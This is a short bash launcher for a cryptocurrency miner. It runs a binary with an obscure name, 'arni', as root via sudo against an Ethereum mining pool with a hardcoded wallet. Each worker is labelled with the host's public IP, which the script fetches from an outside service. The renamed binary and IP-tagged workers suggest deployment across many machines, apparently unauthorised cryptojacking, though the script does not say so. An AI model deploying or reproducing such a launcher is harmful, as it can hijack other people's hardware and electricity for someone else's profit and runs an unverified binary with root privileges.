#!/bin/bash

POOL=eu1.ethermine.org:4444
WALLET=0x3f6b9d78d50057e22859ac607644c5c6e32e6241.$(echo "$(curl -s ifconfig.me)" | tr . _ )

cd "$(dirname "$0")"

chmod +x ./arni && sudo ./arni -pool $POOL -wal $WALLET $@ -pass x -proto 2 -stales 0